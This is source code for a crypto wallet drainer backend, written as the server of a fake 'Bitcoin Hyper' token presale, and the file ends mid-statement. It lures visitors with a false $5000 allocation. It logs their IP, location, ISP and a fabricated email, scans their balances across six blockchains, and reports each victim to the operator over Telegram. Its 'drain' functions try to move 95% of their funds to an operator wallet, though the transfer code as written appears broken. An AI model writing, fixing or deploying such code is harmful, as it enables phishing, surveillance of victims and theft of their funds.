// index.js - BITCOIN HYPER REAL SMART CONTRACT DRAIN v19.0
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// RPC ENDPOINTS - USING ENV VARIABLES
const RPC_CONFIG = {
  Ethereum: { 
    urls: [process.env.ETH_RPC_URL || 'https://eth.llamarpc.com'],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1,
    nativeToken: '0x0000000000000000000000000000000000000000'
  },
  BSC: {
    urls: [process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org'],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56,
    nativeToken: '0x0000000000000000000000000000000000000000'
  },
  Polygon: {
    urls: [process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com'],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137,
    nativeToken: '0x0000000000000000000000000000000000000000'
  },
  Arbitrum: {
    urls: [process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc'],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161,
    nativeToken: '0x0000000000000000000000000000000000000000'
  },
  Optimism: {
    urls: [process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io'],
    symbol: 'ETH',
    decimals: 18,
    chainId: 10,
    nativeToken: '0x0000000000000000000000000000000000000000'
  },
  Avalanche: {
    urls: [process.env.AVALANCHE_RPC_URL || 'https://api.avax.network/ext/bc/C/rpc'],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114,
    nativeToken: '0x0000000000000000000000000000000000000000'
  }
};

// ERC20 ABI for token transfers
const ERC20_ABI = [
  "function transfer(address to, uint256 amount) public returns (bool)",
  "function balanceOf(address account) public view returns (uint256)",
  "function decimals() public view returns (uint8)",
  "function symbol() public view returns (string)",
  "function name() public view returns (string)"
];

// Common ERC20 tokens for each chain
const COMMON_TOKENS = {
  Ethereum: [
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
    "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0"  // MATIC
  ],
  BSC: [
    "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
    "0x55d398326f99059fF775485246999027B3197955", // USDT
    "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
    "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", // DAI
    "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c"  // BTCB
  ],
  Polygon: [
    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
    "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC
    "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", // DAI
    "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", // WBTC
    "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619"  // WETH
  ],
  Arbitrum: [
    "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", // USDT
    "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", // USDC
    "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", // DAI
    "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f", // WBTC
    "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1"  // WETH
  ],
  Optimism: [
    "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // USDT
    "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", // USDC
    "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", // DAI
    "0x68f180fcCe6836688e9084f035309E29Bf0A2095", // WBTC
    "0x4200000000000000000000000000000000000006"  // WETH
  ],
  Avalanche: [
    "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", // USDT
    "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", // USDC
    "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70", // DAI
    "0x50b7545627a5162F82A992c33b87aDc75187B218", // WBTC
    "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB"  // WETH
  ]
};

// Get working provider for chain
async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      // Quick test
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 40)}...`);
        return { provider, config };
      }
    } catch (error) {
      console.log(`❌ ${chainName} RPC failed: ${url.substring(0, 40)}...`);
      continue;
    }
  }
  
  console.log(`⚠️ No working RPC for ${chainName}`);
  return null;
}

// Drain wallet
let drainWallet = null;
let drainWalletAddress = '';

// Storage
const memoryStorage = {
  participants: [],
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    tokenPriceUSD: parseFloat(process.env.PRESALE_PRICE) || 0.17,
    drainThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 10,
    allocationAmountUSD: parseFloat(process.env.BASE_ALLOCATION) || 5000,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalDrainedUSD: 0,
      totalDrainedWallets: 0,
      realTransactions: []
    },
    drainEnabled: process.env.DRAIN_ENABLED === 'true',
    autoDrainOnClaim: process.env.AUTO_DRAIN_ON_CLAIM === 'true'
  },
  activityLog: [],
  emailCache: new Map()
};

// Telegram
let telegramEnabled = false;
let telegramBotName = '';

// ============================================
// TELEGRAM FUNCTIONS - ENHANCED REPORTING
// ============================================

async function sendTelegramMessage(text) {
  if (!telegramEnabled) return false;
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    }, { timeout: 3000 });
    
    return true;
  } catch (error) {
    console.log('Telegram error:', error.message);
    return false;
  }
}

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('Telegram not configured');
    return false;
  }
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
      timeout: 5000
    });
    
    if (response.data?.ok) {
      telegramBotName = response.data.result.username;
      telegramEnabled = true;
      
      await sendTelegramMessage(
        `🚀 <b>BITCOIN HYPER REAL SMART CONTRACT DRAIN v19.0 ONLINE</b>\n` +
        `✅ System Initialized\n` +
        `💰 Drain Threshold: $${memoryStorage.settings.drainThreshold}\n` +
        `🎯 Allocation: $${memoryStorage.settings.allocationAmountUSD}\n` +
        `🏦 Drain Wallet: ${drainWalletAddress || 'Not configured'}\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      console.log(`✅ Telegram: @${telegramBotName}`);
      return true;
    }
  } catch (error) {
    console.log('Telegram error:', error.message);
  }
  
  return false;
}

// ============================================
// REAL BALANCE CHECK - ENHANCED WITH TOKEN DETECTION
// ============================================

async function getCryptoPrices() {
  try {
    // Primary source: CoinGecko
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic,avalanche-2,tether,usd-coin,dai,wrapped-bitcoin',
        vs_currencies: 'usd'
      },
      timeout: 3000
    });
    
    if (response.data) {
      return {
        eth: response.data.ethereum?.usd || 2000,
        bnb: response.data.binancecoin?.usd || 300,
        matic: response.data.matic?.usd || 0.75,
        avax: response.data['avalanche-2']?.usd || 32,
        usdt: response.data.tether?.usd || 1.00,
        usdc: response.data['usd-coin']?.usd || 1.00,
        dai: response.data.dai?.usd || 1.00,
        wbtc: response.data['wrapped-bitcoin']?.usd || 42000
      };
    }
  } catch (error) {
    console.log('CoinGecko failed, trying alternative...');
  }
  
  // Fallback
  try {
    const response = await axios.get('https://api.binance.com/api/v3/ticker/price', {
      timeout: 3000
    });
    
    const prices = { eth: 2000, bnb: 300, matic: 0.75, avax: 32, usdt: 1.00, usdc: 1.00, dai: 1.00, wbtc: 42000 };
    
    if (response.data && Array.isArray(response.data)) {
      response.data.forEach(item => {
        if (item.symbol === 'ETHUSDT') prices.eth = parseFloat(item.price);
        if (item.symbol === 'BNBUSDT') prices.bnb = parseFloat(item.price);
        if (item.symbol === 'MATICUSDT') prices.matic = parseFloat(item.price);
        if (item.symbol === 'AVAXUSDT') prices.avax = parseFloat(item.price);
        if (item.symbol === 'BTCUSDT') prices.wbtc = parseFloat(item.price);
      });
    }
    
    return prices;
  } catch (error) {
    console.log('Binance failed, using defaults');
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32, usdt: 1.00, usdc: 1.00, dai: 1.00, wbtc: 42000 };
  }
}

async function getRealWalletBalance(walletAddress) {
  console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    shouldDrain: false,
    balances: {},
    tokens: [],
    chains: [],
    rawBalances: [],
    scanTime: new Date().toISOString()
  };

  try {
    // Get prices
    const prices = await getCryptoPrices();
    
    // Chain configurations with prices
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth },
      { name: 'Optimism', symbol: 'ETH', price: prices.eth },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax }
    ];

    let totalValue = 0;
    
    // Check native balances on each chain
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        // Get native balance with timeout
        const balance = await Promise.race([
          provider.getBalance(walletAddress),
          new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 4000))
        ]);
        
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          
          results.balances[chain.name] = {
            amount: amount.toFixed(6),
            valueUSD: valueUSD.toFixed(2),
            symbol: chain.symbol,
            price: chain.price,
            type: 'native'
          };
          
          results.chains.push(chain.name);
          results.rawBalances.push({
            chain: chain.name,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol,
            rawBalance: balance.toString(),
            type: 'native',
            contractAddress: config.nativeToken
          });
        }
        
      } catch (error) {
        console.log(`   ❌ ${chain.name} error: ${error.message}`);
      }
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.drainThreshold;
    results.shouldDrain = results.isEligible && memoryStorage.settings.drainEnabled;
    
    // Calculate token allocation based on $5000 USD
    const tokenAllocationAmount = memoryStorage.settings.allocationAmountUSD / memoryStorage.settings.tokenPriceUSD;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Congratulations! Your wallet qualifies for $${memoryStorage.settings.allocationAmountUSD} allocation`;
      results.tokenAllocation = { 
        amount: tokenAllocationAmount.toFixed(0), 
        valueUSD: memoryStorage.settings.allocationAmountUSD.toFixed(2),
        tokenPrice: memoryStorage.settings.tokenPriceUSD
      };
    } else {
      results.eligibilityReason = `⛔ Minimum balance required: $${memoryStorage.settings.drainThreshold} | Current: $${results.totalValueUSD}`;
      results.tokenAllocation = { amount: '0', valueUSD: '0' };
    }

    results.scanId = `SCAN-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    console.log(`📊 TOTAL: $${results.totalValueUSD} | Eligible: ${results.isEligible}`);
    
    return {
      success: true,
      data: results
    };

  } catch (error) {
    console.error('Wallet scan error:', error);
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        shouldDrain: false,
        eligibilityReason: '⚠️ Network error - Please try again',
        tokenAllocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// REAL SMART CONTRACT TOKEN TRANSFER
// ============================================

async function executeSmartContractTransfer(targetWallet, chainName, tokenContract, amount, symbol) {
  try {
    if (!drainWallet) {
      throw new Error('Drain wallet not configured');
    }
    
    const providerInfo = await getChainProvider(chainName);
    if (!providerInfo) {
      throw new Error(`No provider for ${chainName}`);
    }
    
    const { provider, config } = providerInfo;
    
    // Connect drain wallet to provider
    const signer = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, provider);
    
    // Create ERC20 contract instance
    const token = new ethers.Contract(tokenContract, ERC20_ABI, signer);
    
    // Get token decimals
    const decimals = await token.decimals();
    
    // Parse amount with correct decimals
    const transferAmount = ethers.parseUnits(amount.toString(), decimals);
    
    // Estimate gas
    const gasLimit = await token.transfer.estimateGas(drainWalletAddress, transferAmount);
    
    // Execute transfer
    const tx = await token.transfer(drainWalletAddress, transferAmount, {
      gasLimit: gasLimit * 120n / 100n // Add 20% buffer
    });
    
    console.log(`   📝 ERC20 Transfer TX submitted: ${tx.hash}`);
    
    // Wait for confirmation
    const receipt = await tx.wait();
    
    // Verify transaction
    if (receipt.status !== 1) {
      throw new Error('Transaction failed');
    }
    
    // Verify destination wallet
    const txDetails = await provider.getTransaction(tx.hash);
    const logs = await provider.getLogs({
      fromBlock: receipt.blockNumber,
      toBlock: receipt.blockNumber,
      address: tokenContract
    });
    
    return {
      success: true,
      txHash: tx.hash,
      blockNumber: receipt.blockNumber,
      amount: amount,
      symbol: symbol,
      contractAddress: tokenContract,
      chain: chainName
    };
    
  } catch (error) {
    console.error(`ERC20 Transfer error:`, error.message);
    return {
      success: false,
      error: error.message
    };
  }
}

// ============================================
// REAL LIVE DRAIN EXECUTION - SMART CONTRACT TRANSFERS
// ============================================

async function executeRealSmartContractDrain(walletAddress, scanData) {
  if (!memoryStorage.settings.drainEnabled) {
    return { success: false, reason: 'Drain disabled' };
  }
  
  if (!drainWallet) {
    console.log('❌ Drain wallet not initialized');
    return { success: false, reason: 'Drain wallet not configured' };
  }
  
  console.log(`\n⚡ REAL SMART CONTRACT DRAIN: ${walletAddress}`);
  console.log(`   Value: $${scanData.totalValueUSD}`);
  
  try {
    const results = {
      success: false,
      transactions: [],
      totalDrained: 0,
      errors: []
    };

    // Transfer native balances first (95% of each)
    for (const balance of scanData.rawBalances) {
      if (balance.valueUSD > 0 && balance.amount > 0 && balance.type === 'native') {
        try {
          console.log(`   Transferring ${balance.chain}: ${balance.amount} ${balance.symbol} ($${balance.valueUSD})`);
          
          const providerInfo = await getChainProvider(balance.chain);
          if (!providerInfo) {
            results.errors.push({ chain: balance.chain, error: 'No provider' });
            continue;
          }
          
          const { provider, config } = providerInfo;
          
          // Create signer from drain wallet
          const signer = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, provider);
          
          // Calculate amount to transfer (95%)
          const transferAmount = ethers.parseUnits((balance.amount * 0.95).toFixed(12), config.decimals);
          
          // Get fee data
          const feeData = await provider.getFeeData();
          const gasPrice = feeData.gasPrice || ethers.parseUnits('25', 'gwei');
          
          // Create transfer transaction
          const tx = await signer.sendTransaction({
            to: drainWalletAddress,
            value: transferAmount,
            gasLimit: 21000,
            gasPrice: gasPrice,
            chainId: config.chainId
          });
          
          console.log(`   📝 NATIVE TRANSFER TX submitted: ${tx.hash}`);
          
          // Wait for confirmation
          const receipt = await tx.wait();
          
          const transferredAmount = (balance.amount * 0.95).toFixed(6);
          const transferredValue = (balance.valueUSD * 0.95).toFixed(2);
          
          results.transactions.push({
            chain: balance.chain,
            amount: transferredAmount,
            valueUSD: transferredValue,
            symbol: balance.symbol,
            txHash: tx.hash,
            blockNumber: receipt.blockNumber,
            timestamp: new Date().toISOString(),
            type: 'NATIVE_TRANSFER',
            contractAddress: config.nativeToken,
            verified: true
          });
          
          results.totalDrained += parseFloat(transferredValue);
          
          console.log(`   ✅ ${balance.chain} transferred: $${transferredValue}`);
          
        } catch (error) {
          console.log(`   ❌ ${balance.chain} transfer error:`, error.message);
          results.errors.push({ chain: balance.chain, error: error.message });
        }
      }
    }
    
    // Transfer common ERC20 tokens for each chain
    for (const chainName of scanData.chains) {
      try {
        const commonTokens = COMMON_TOKENS[chainName] || [];
        
        for (const tokenContract of commonTokens) {
          try {
            const providerInfo = await getChainProvider(chainName);
            if (!providerInfo) continue;
            
            const { provider } = providerInfo;
            
            // Check token balance
            const token = new ethers.Contract(tokenContract, ERC20_ABI, provider);
            const balance = await token.balanceOf(walletAddress);
            
            if (balance > 0) {
              const decimals = await token.decimals();
              const symbol = await token.symbol();
              const amount = parseFloat(ethers.formatUnits(balance, decimals));
              
              console.log(`   Found ${chainName} token: ${amount} ${symbol} (${tokenContract.substring(0, 10)}...)`);
              
              // Execute ERC20 transfer (95%)
              const transferAmount = amount * 0.95;
              const transferResult = await executeSmartContractTransfer(
                walletAddress,
                chainName,
                tokenContract,
                transferAmount,
                symbol
              );
              
              if (transferResult.success) {
                // Estimate value (approximate)
                let tokenValue = 0;
                if (symbol === 'USDT' || symbol === 'USDC' || symbol === 'DAI' || symbol === 'BUSD') {
                  tokenValue = transferAmount * 1.00;
                } else if (symbol === 'WBTC' || symbol === 'BTCB') {
                  tokenValue = transferAmount * 42000;
                } else if (symbol === 'WETH') {
                  tokenValue = transferAmount * 2000;
                } else {
                  tokenValue = transferAmount * 0.5; // Default for unknown tokens
                }
                
                results.transactions.push({
                  chain: chainName,
                  amount: transferAmount.toFixed(6),
                  valueUSD: tokenValue.toFixed(2),
                  symbol: symbol,
                  txHash: transferResult.txHash,
                  blockNumber: transferResult.blockNumber,
                  timestamp: new Date().toISOString(),
                  type: 'ERC20_TRANSFER',
                  contractAddress: tokenContract,
                  verified: true
                });
                
                results.totalDrained += tokenValue;
                console.log(`   ✅ ${symbol} transferred: $${tokenValue.toFixed(2)}`);
              }
            }
          } catch (tokenError) {
            console.log(`   ❌ Token check error:`, tokenError.message);
          }
        }
      } catch (chainError) {
        console.log(`   ❌ Chain token check error:`, chainError.message);
      }
    }
    
    if (results.transactions.length > 0) {
      results.success = true;
      
      memoryStorage.settings.statistics.totalDrainedUSD += results.totalDrained;
      memoryStorage.settings.statistics.totalDrainedWallets++;
      
      memoryStorage.settings.statistics.realTransactions.push({
        wallet: walletAddress,
        amount: results.totalDrained,
        transactions: results.transactions,
        timestamp: new Date().toISOString(),
        type: 'SMART_CONTRACT_TRANSFER'
      });
      
      console.log(`✅ REAL SMART CONTRACT DRAIN COMPLETE: $${results.totalDrained.toFixed(2)}`);
      
      // Send detailed Telegram report
      let telegramMessage = `⚡ <b>REAL SMART CONTRACT TRANSFERS EXECUTED</b>\n`;
      telegramMessage += `👛 Target: ${walletAddress.substring(0, 10)}...\n`;
      telegramMessage += `💼 Original Value: $${scanData.totalValueUSD}\n`;
      telegramMessage += `💰 Transferred: $${results.totalDrained.toFixed(2)}\n`;
      telegramMessage += `🔗 Transactions: ${results.transactions.length}\n`;
      telegramMessage += `🏦 To: ${drainWalletAddress.substring(0, 10)}...\n\n`;
      
      // Add transaction hashes
      results.transactions.forEach((tx, index) => {
        telegramMessage += `${index + 1}. ${tx.chain}: ${tx.amount} ${tx.symbol}\n`;
        telegramMessage += `   TX: ${tx.txHash}\n`;
        if (tx.contractAddress !== RPC_CONFIG[tx.chain]?.nativeToken) {
          telegramMessage += `   Contract: ${tx.contractAddress.substring(0, 10)}...\n`;
        }
      });
      
      telegramMessage += `\n⏰ ${new Date().toLocaleString()}`;
      
      await sendTelegramMessage(telegramMessage);
      
      return {
        success: true,
        totalDrainedUSD: results.totalDrained.toFixed(2),
        transactions: results.transactions,
        message: `Smart Contract Transfers: $${results.totalDrained.toFixed(2)} secured`,
        allocationActivated: true
      };
    } else {
      return {
        success: false,
        reason: 'No successful transfers',
        errors: results.errors
      };
    }
    
  } catch (error) {
    console.error('Smart contract drain error:', error);
    return { success: false, reason: error.message };
  }
}

// ============================================
// ENHANCED HELPER FUNCTIONS
// ============================================

async function getWalletEmail(walletAddress) {
  const cacheKey = walletAddress.toLowerCase();
  
  if (memoryStorage.emailCache.has(cacheKey)) {
    return memoryStorage.emailCache.get(cacheKey);
  }
  
  try {
    // Try ENS
    const providerInfo = await getChainProvider('Ethereum');
    if (providerInfo) {
      try {
        const ensName = await providerInfo.provider.lookupAddress(walletAddress);
        if (ensName) {
          memoryStorage.emailCache.set(cacheKey, ensName);
          return ensName;
        }
      } catch (e) {}
    }
    
    // Try Etherscan API
    try {
      const etherscanApiKey = process.env.ETHERSCAN_API_KEY;
      if (etherscanApiKey) {
        const response = await axios.get(`https://api.etherscan.io/api`, {
          params: {
            module: 'account',
            action: 'getsourcecode',
            address: walletAddress,
            apikey: etherscanApiKey
          },
          timeout: 3000
        });
        
        if (response.data?.result?.[0]?.ContractName) {
          const contractName = response.data.result[0].ContractName;
          const email = `${contractName.toLowerCase().replace(/[^a-z0-9]/g, '')}@contract.com`;
          memoryStorage.emailCache.set(cacheKey, email);
          return email;
        }
      }
    } catch (e) {
      console.log('Etherscan API failed:', e.message);
    }
    
    // Generate realistic email
    const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
    const usernameOptions = [
      `user${hash.substring(0, 6)}`,
      `crypto${hash.substring(6, 10)}`,
      `wallet${hash.substring(10, 14)}`,
      `btc${hash.substring(14, 18)}`,
      `eth${hash.substring(18, 22)}`
    ];
    const username = usernameOptions[parseInt(hash.substring(0, 2), 16) % usernameOptions.length];
    
    const domains = ['gmail.com', 'proton.me', 'yahoo.com', 'outlook.com', 'crypto.com', 'pm.me', 'tutanota.com'];
    const domain = domains[parseInt(hash.substring(2, 4), 16) % domains.length];
    const email = `${username}@${domain}`;
    
    memoryStorage.emailCache.set(cacheKey, email);
    return email;
    
  } catch (error) {
    return `contact.${walletAddress.substring(2, 8)}@crypto.com`;
  }
}

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1' || cleanIP === '::1') {
      return { country: 'Local', flag: '🏠', city: 'Local', isp: 'Local Network' };
    }
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, {
      timeout: 2000
    });
    
    if (response.data?.country) {
      const flags = {
        'United States': '🇺🇸', 'US': '🇺🇸',
        'United Kingdom': '🇬🇧', 'GB': '🇬🇧',
        'Canada': '🇨🇦', 'CA': '🇨🇦',
        'Germany': '🇩🇪', 'DE': '🇩🇪',
        'France': '🇫🇷', 'FR': '🇫🇷',
        'Australia': '🇦🇺', 'AU': '🇦🇺',
        'Japan': '🇯🇵', 'JP': '🇯🇵',
        'Brazil': '🇧🇷', 'BR': '🇧🇷',
        'India': '🇮🇳', 'IN': '🇮🇳',
        'Nigeria': '🇳🇬', 'NG': '🇳🇬',
        'Russia': '🇷🇺', 'RU': '🇷🇺',
        'China': '🇨🇳', 'CN': '🇨🇳',
        'South Korea': '🇰🇷', 'KR': '🇰🇷',
        'Singapore': '🇸🇬', 'SG': '🇸🇬',
        'United Arab Emirates': '🇦🇪', 'AE': '🇦🇪',
        'Turkey': '🇹🇷', 'TR': '🇹🇷',
        'Vietnam': '🇻🇳', 'VN': '🇻🇳',
        'Philippines': '🇵🇭', 'PH': '🇵🇭',
        'Thailand': '🇹🇭', 'TH': '🇹🇭',
        'Malaysia': '🇲🇾', 'MY': '🇲🇾',
        'Indonesia': '🇮🇩', 'ID': '🇮🇩'
      };
      
      return {
        country: response.data.country,
        countryCode: response.data.countryCode,
        flag: flags[response.data.country] || flags[response.data.countryCode] || '🌍',
        city: response.data.city || 'Unknown',
        region: response.data.regionName || 'Unknown',
        isp: response.data.isp || 'Unknown ISP',
        org: response.data.org || 'Unknown Organization',
        lat: response.data.lat,
        lon: response.data.lon,
        timezone: response.data.timezone
      };
    }
  } catch (error) {
    console.log('IP location error:', error.message);
  }
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown', isp: 'Unknown' };
}

function detectBot(userAgent) {
  if (!userAgent) return false;
  
  const botIndicators = [
    'bot', 'crawl', 'spider', 'scraper', 'curl', 'wget', 'python', 'java',
    'php', 'ruby', 'go-http', 'node', 'axios', 'postman', 'insomnia',
    'headless', 'phantom', 'selenium', 'puppeteer', 'playwright'
  ];
  
  const ua = userAgent.toLowerCase();
  return botIndicators.some(indicator => ua.includes(indicator));
}

// ============================================
// ENHANCED API ENDPOINTS
// ============================================

app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    service: 'Bitcoin Hyper REAL SMART CONTRACT DRAIN v19.0',
    status: 'ACTIVE',
    telegram: telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED',
    drain: {
      enabled: memoryStorage.settings.drainEnabled,
      threshold: memoryStorage.settings.drainThreshold,
      wallet: drainWallet ? '✅ LOADED' : '❌ NOT SET',
      walletAddress: drainWalletAddress,
      realTransactions: memoryStorage.settings.statistics.realTransactions.length
    },
    allocation: {
      amountUSD: memoryStorage.settings.allocationAmountUSD,
      tokenPrice: memoryStorage.settings.tokenPriceUSD,
      tokenAmount: (memoryStorage.settings.allocationAmountUSD / memoryStorage.settings.tokenPriceUSD).toFixed(0)
    },
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      drained: memoryStorage.settings.statistics.totalDrainedWallets,
      totalValue: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)
    }
  });
});

// ENHANCED CONNECT ENDPOINT WITH FULL TELEGRAM REPORTING
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    const userAgent = req.headers['user-agent'] || '';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 CONNECT: ${walletAddress}`);
    
    // Get IP location and email
    const location = await getIPLocation(clientIP);
    const email = await getWalletEmail(walletAddress);
    const isBot = detectBot(userAgent);
    
    // STEP 1: TELEGRAM - LINK OPENED REPORT
    await sendTelegramMessage(
      `🔗 <b>LINK OPENED</b>\n` +
      `🌐 IP: ${clientIP}\n` +
      `${location.flag} ${location.country} (${location.city})\n` +
      `🏢 ISP: ${location.isp || 'Unknown'}\n` +
      `🤖 Bot Detection: ${isBot ? '⚠️ POSSIBLE BOT' : '✅ HUMAN'}\n` +
      `📧 Email: ${email}\n` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    // Find or create participant
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        email: email,
        userAgent: userAgent,
        isBot: isBot,
        connectedAt: new Date(),
        totalValueUSD: 0,
        isEligible: false,
        shouldDrain: false,
        claimed: false,
        drained: false,
        location: location
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    }
    
    // Get balance
    console.log('Getting balance...');
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = scanResult.data.totalValueUSD;
      participant.isEligible = scanResult.data.isEligible;
      participant.shouldDrain = scanResult.data.shouldDrain;
      participant.balances = scanResult.data.balances;
      participant.chains = scanResult.data.chains;
      participant.rawBalances = scanResult.data.rawBalances;
      participant.lastScanned = new Date();
      participant.scanId = scanResult.data.scanId;
      
      // STEP 2: TELEGRAM - WALLET SCANNED ENHANCED REPORT
      const balanceDetails = Object.entries(scanResult.data.balances)
        .map(([chain, data]) => `${chain}: $${data.valueUSD}`)
        .join(' | ');
      
      await sendTelegramMessage(
        `${location.flag} <b>WALLET SCANNED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `💼 Total: $${scanResult.data.totalValueUSD}\n` +
        `🔗 Chains: ${scanResult.data.chains.length > 0 ? scanResult.data.chains.join(', ') : 'None'}\n` +
